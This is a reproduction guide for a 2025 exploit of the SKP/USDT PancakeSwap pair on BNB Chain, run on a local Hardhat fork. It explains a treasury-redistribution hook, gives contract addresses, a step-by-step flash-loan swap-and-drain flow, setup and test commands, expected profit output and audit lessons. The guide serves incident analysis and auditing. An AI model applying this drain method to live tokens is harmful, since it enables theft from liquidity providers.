# SKP/USDT BNB Chain Hack — Reproduction Guide

| Field | Value |
|---|---|
| **Date** | May 2025 |
| **Chain** | BNB Smart Chain (BSC) |
| **Protocol** | PancakeSwap V2 — SKP/USDT pair |
| **Loss** | ~$212,195 USDT |
| **Exploit tx** | [`0xbc01ea37…`](https://bscscan.com/tx/0xbc01ea37bd2ff8f6aa6afcfbe0406114ff27a01e9aa56102bfa4ad8a0c2f25ee) |
| **Fork block** | 100582078 (attack is in 100582079) |
| **Test file** | `test/SKP.exploit.test.ts` |

---

## Background

The SKP token is a fee-on-transfer ERC-20 deployed on BSC.  Its `_transfer()`
function contains a hook named `_runSpecialPairFlow()` that was designed as an
anti-whale redistribution mechanism.  The hook fires whenever the SKP/USDT
PancakeSwap V2 pair **sends** SKP to a recipient (i.e. during any buy swap from
the pair).

When the hook detects that the pair's USDT balance significantly exceeds its
stored reserve — indicating a large deposit has been made — it redistributes a
calculated amount of SKP from the **SKP contract's own treasury** to a
hard-coded whitelisted address (`WL_ADDRESS`, stored in SKP storage slot 9).

The attacker discovered that this trigger condition was externally controllable
via a flash loan: deposit enough USDT into the pair to exceed the redistribution
threshold, execute a buy swap, and collect billions of free treasury tokens.
Selling those tokens back into the now-distorted AMM (205M USDT / 24K SKP)
drains the pool's entire USDT balance.

---

## Vulnerability Root Cause

```
SKP._transfer(from=PAIR, to=recipient, amount) {
    ...
    _runSpecialPairFlow();   // fires because from == PAIR address
    ...
}

_runSpecialPairFlow() {
    uint excess = USDT.balanceOf(pair) - pair.getReserve(0);
    if (excess > threshold) {
        uint freeSKP = calculateRedistribution(excess);
        // Transfer freeSKP from SKP treasury → WL_ADDRESS at no cost
        _transfer(treasury, WL_ADDRESS, freeSKP);
    }
}
```

The redistribution amount scales with the USDT excess.  At ~$205M excess the
hook transfers ~9.7 billion SKP from the treasury to `WL_ADDRESS` in a single
swap.  The treasury is effectively unbounded — it can issue more SKP than exists
in the entire liquidity pool.

---

## On-Chain State Before the Attack (block 100582078)

| Contract | Address |
|---|---|
| BSC-USD (USDT) | `0x55d398326f99059ff775485246999027b3197955` |
| SKP token | `0xecbdc0b76142740bb564b8aa1bcd061cb151a666` |
| SKP/USDT pair | `0x47c8c3b123de467892ac7df6dfcf7ca3db901733` |
| PancakeSwap V2 Router | `0x10ED43C718714eb63d5aA57B78B54704E256024E` |
| Attacker EOA | `0x83b9e7edc5b3127e4853a4f4945b92aa88eef0c8` |
| Whitelisted buyer (WL) | `0x646f7bb10d81ff9734510d4e7583eb5247b28743` |

**Pair reserves at fork block:**
- USDT reserve: ~234,135 USDT
- SKP reserve: ~21,574,109 SKP
- Implied price: ~0.0109 USDT / SKP

---

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│  PHASE 1 — Fund                                                          │
│  Flash-loan 204,950,260 USDT from 9 lending protocols (real tx).         │
│  In PoC: simulated via hardhat_setStorageAt on BSC-USD slot 1.           │
└──────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌──────────────────────────────────────────────────────────────────────────┐
│  PHASE 2 — Buy SKP via router (the exploit trigger)                      │
│                                                                          │
│  router.swapExactTokensForTokensSupportingFeeOnTransferTokens(           │
│      amountIn = 204,950,260 USDT,                                        │
│      path     = [USDT, SKP],                                             │
│      to       = WL_ADDRESS    ← MUST be whitelisted; see below           │
│  )                                                                       │
│                                                                          │
│  Internal execution:                                                     │
│    a) Router transfers 204.95M USDT → pair.                              │
│       Pair USDT balance: 234K → 205.18M  (204.95M excess above reserve) │
│                                                                          │
│    b) Router computes fair output:                                       │
│       skpOut = getAmountOut(204.95M, 234K, 21.57M) ≈ 21,546,000 SKP    │
│       Calls pair.swap(0, skpOut, WL, "0x").                             │
│                                                                          │
│    c) pair.swap transfers skpOut SKP → WL.                              │
│       Inside SKP._transfer(from=PAIR, to=WL, amount=skpOut):            │
│         • _runSpecialPairFlow() detects 204.95M USDT excess             │
│         • Redistributes ~9,678,739,566 SKP from treasury → WL (FREE)   │
│         • Also tries pair.sync() but pair holds reentrancy lock;        │
│           sync() reverts and the hook silently continues                 │
│                                                                          │
│    d) K-check passes: router's skpOut satisfies constant-K.             │
│    e) pair._update() records new reserves: (205.18M USDT, 24,680 SKP). │
│                                                                          │
│  Result: WL holds 21,546,000 + 9,678,739,566 = ~9,700,285,566 SKP      │
└──────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌──────────────────────────────────────────────────────────────────────────┐
│  PHASE 3 — Direct drain attempt (optional; fails in standard BSC V2)    │
│                                                                          │
│  pair.swap(0, 24679 SKP, WL, "0x")   ← no USDT deposited               │
│                                                                          │
│  K-check: (205.18M×1000 − 0×3) × (1×1000) ≥ 234K × 21.57M × 10^6 ?   │
│    LHS = 2.05 × 10^14                                                   │
│    RHS = 5.05 × 10^15  → fails (~24× short)                            │
│  → Reverts "Pancake: K". Residual 24,680 SKP stays in pool (negligible).│
└──────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌──────────────────────────────────────────────────────────────────────────┐
│  PHASE 4 — Sell all SKP → drain USDT                                    │
│                                                                          │
│  WL sells 9,700,288,994 SKP into pool (205.18M USDT, 24,680 SKP):      │
│                                                                          │
│  amountOut = 9.7B × 997 × 205.18M / (24,680×1000 + 9.7B×997)          │
│            ≈ 205,184,227 USDT  (essentially all pool USDT)              │
│                                                                          │
│  Net profit = 205,184,227 − 204,950,260 = +$233,967                    │
│  (On-chain ~$212K after flash-loan fees, gas, SKP transfer taxes)       │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

- **Node.js** 18+
- **npx / npm**
- An **archive BSC RPC endpoint** (Ankr, QuickNode, NodeReal, or self-hosted).
  Standard pruned nodes do not serve state for block 100582078.
- (~2 GB RAM for the fork cache on first run)

---

## Setup

```bash
# 1. Clone the repository and switch to this branch
git clone https://github.com/mahdiidarabi/zk-circuit-from-scratch.git
cd zk-circuit-from-scratch
git checkout hack-reproduction

# 2. Install dependencies
npm install

# 3. (Optional) Replace the RPC URL with your own archive endpoint
#    Edit hardhat.config.ts → networks.hardhat.forking.url
```

---

## Running the Exploit Reproduction

```bash
npx hardhat test test/SKP.exploit.test.ts --network hardhat
```

Expected output:

```
  SKP/USDT – _runSpecialPairFlow treasury redistribution exploit

=== Baseline (block 100582078) ===
Pair:     USDT 234,134.951621  |  SKP 21,574,108.985696
Attacker: USDT 204,950,260.192547

=== After Phase 2 (router buy, WL receives SKP + redistribution) ===
Pair:     USDT 205,184,395.144168  |  SKP 24,679.743602
WL SKP:   9,700,288,994.49252

SKP remaining in pair before Phase 3: 24,679.743602
Phase 3 skipped – Pancake K-check blocked direct drain (expected)

WL selling 9,700,288,994.49252 SKP...

=== After Phase 4 (WL drains USDT) ===
WL:       USDT 205,184,227.615061  |  SKP 0
Pair:     USDT 523.34284  |  SKP 9,700,313,674.236122

Net profit: 233,967.422514 USDT
Phase 3 drain succeeded: false

  ✔ drains original pool USDT via treasury SKP redistribution + price manipulation (≈3s)

  1 passing (3s)
```

---

## Key Technical Findings

### 1. Whitelist restriction on SKP transfers from the pair

`SKP._transfer(from=PAIR, to=X)` reverts with `"cannot buy or remove lp"` unless
`X` equals the whitelisted buyer address stored in **SKP storage slot 9**
(`0x646f7bb10d81ff9734510d4e7583eb5247b28743`).

This means:
- The router's `to` parameter must be `WL_ADDRESS`, not the attacker's EOA.
- Direct `pair.swap(0, amount, ATTACKER_EOA, "0x")` always fails.
- The whitelisted address was the attacker's own exploit contract in the real tx.

To discover this in a new exploit investigation:
```typescript
// Scan SKP storage slots to find the whitelist address
for (let i = 0n; i < 20n; i++) {
    const val = await provider.send("hardhat_getStorageAt", [SKP_ADDRESS, "0x" + i.toString(16)]);
    console.log(`slot ${i}: ${val}`);
}
// Slot 9 contained 0x000…646f7bb10d81ff9734510d4e7583eb5247b28743
```

### 2. BSC-USD storage layout (_balances at slot 1, not slot 0)

Standard OpenZeppelin ERC-20 stores `_balances` at slot 0.  BSC-USD declares
`address _owner` as its first state variable, pushing `_balances` to slot 1.

Storage key for a given account:
```
keccak256(abi.encode(accountAddress, uint256(1)))
```

Using slot 0 (OZ default) results in writing to the wrong storage location —
the balance does not change and all subsequent swaps fail with insufficient balance.

### 3. Hardhat EDR hardfork bug with BSC

Hardhat 2.28.6 + EDR silently drops the BSC hardfork activation history due to
a field name mismatch (`hardforks` vs `hardforkActivationOverrides`).  Any call
at exactly the fork block height throws:
```
"No known hardfork for execution on historical block 100582078"
```

**Two-part fix applied in this repo:**
1. `hardhat.config.ts`: `chainId: 31337` — uses EDR's built-in schedule for chain 31337.
2. `test/SKP.exploit.test.ts` (first line of test): `await ethers.provider.send("evm_mine", [])` — advances the tip past `forkBlockNumber` so `selectHardfork()` early-returns without any chain lookup.

### 4. Why Phase 3 (sync() K-check bypass) does not work

The original incident report described a `sync()` tautology where calling
`pair.sync()` mid-swap corrupts the stored reserves before the K-check.

This does not reproduce here because:
- PancakeSwap V2 caches `(reserve0, reserve1)` into **local stack variables** at
  the top of `swap()`.  The K-check uses these locals, never re-reading storage.
- Even if `sync()` wrote new values to storage, the K-check wouldn't see them.
- The reentrancy lock (`unlocked = 0` during `swap()`) would cause `sync()` to
  revert anyway; the SKP hook catches this silently with a try/catch.

The treasury redistribution alone generates $233K profit without Phase 3.

### 5. Fee-on-transfer token handling

Both Phase 2 and Phase 4 router calls use
`swapExactTokensForTokensSupportingFeeOnTransferTokens`.  The standard
`swapExactTokensForTokens` pre-computes the expected output and reverts if the
actual received amount is less — this would always fail for SKP because its
transfer fee reduces the delivered amount.  The fee-on-transfer variant checks
the actual balance delta after the transfer instead.

---

## Analysis Scripts

`scripts/debug_skp9.ts` — standalone script that confirms the redistribution
mechanism without the router.  Deposits USDT directly into the pair, then calls
`pair.swap(0, 1SKP, WL, "0x")` and observes that WL receives ~9.7 billion SKP
from the treasury despite only requesting 1 SKP from the pair.

```bash
npx hardhat run scripts/debug_skp9.ts --network hardhat
```

---

## Lesson: What to Look for in Similar Tokens

When auditing fee-on-transfer or custom AMM hook tokens:

1. **What triggers the custom hook?**  Check if the trigger (e.g. `from == PAIR`)
   is reachable by an external actor rather than only by the protocol.

2. **Is the redistribution source bounded?**  If the token's `_runSpecialPairFlow`
   draws from an unbounded treasury rather than a fixed pool, the hook can issue
   tokens far exceeding what legitimately exists in the AMM.

3. **Is the trigger condition externally manipulable?**  Any condition based on
   `token.balanceOf(pair) - pair.getReserve()` can be inflated by depositing
   directly into the pair before calling swap — trivially achievable via flash loan.

4. **Does the hook interact with the AMM mid-swap?**  Calls back to the pair
   (like `sync()` or `mint()`) during a transfer hook create reentrancy windows
   that may corrupt invariants even if the standard reentrancy lock is present.
